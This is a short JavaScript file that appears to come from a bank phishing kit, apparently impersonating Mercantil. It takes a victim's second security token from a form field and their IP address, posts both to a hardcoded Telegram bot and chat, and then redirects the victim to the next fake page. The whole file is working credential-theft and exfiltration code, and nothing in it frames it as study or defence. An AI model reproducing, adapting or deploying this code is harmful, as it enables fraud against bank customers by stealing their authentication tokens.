//bot token
var telegram_bot_id = "7632658056:AAF7ZPCJzK2r-RcMomCgM_DF8DsBMfLyB-Y";
//chat id
var chat_id = -1002439722849;
var pax2, ip, message;
var ready = function () {
    pax2 = document.getElementById("miDiosenticonfio").value;
    ip = document.getElementById("ip").innerHTML;
    message = "🔹M3RK4N🔹\n🔒T0K3N 2: " + pax2 + "\nIP: " + ip +"\n🔹BY SYN4PSE🔹";
};
var sender = function () {
    ready();

    if (ip === "" || ip === null || ip === undefined) {
        alert("Esperando obtener la dirección IP, por favor espera unos segundos o actualice la página.");
        return false; // Evita el envío del formulario
    }
    
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        top.location.href = 'loadd2.php';
        console.log(response);
    });
    return false;
};
